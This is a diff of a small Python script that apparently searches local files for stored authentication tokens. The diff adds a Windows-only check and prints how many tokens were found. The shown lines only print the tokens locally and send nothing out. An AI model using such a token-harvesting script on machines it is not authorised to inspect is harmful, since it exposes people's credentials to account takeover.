@@ -1,6 +1,10 @@
 import os
 import re
 
+from sys import platform
+if platform != "win32":
+    raise TypeError("This program is only supported on Windows")
+
 
 def findTokens():
     tokenList = []
@@ -49,5 +53,6 @@ def extract_tokens(path):
 
 if __name__ == "__main__":
     tokens = findTokens()
+    print(f"{len(tokens)} tokens found:")
     for token in tokens:
         print(token)
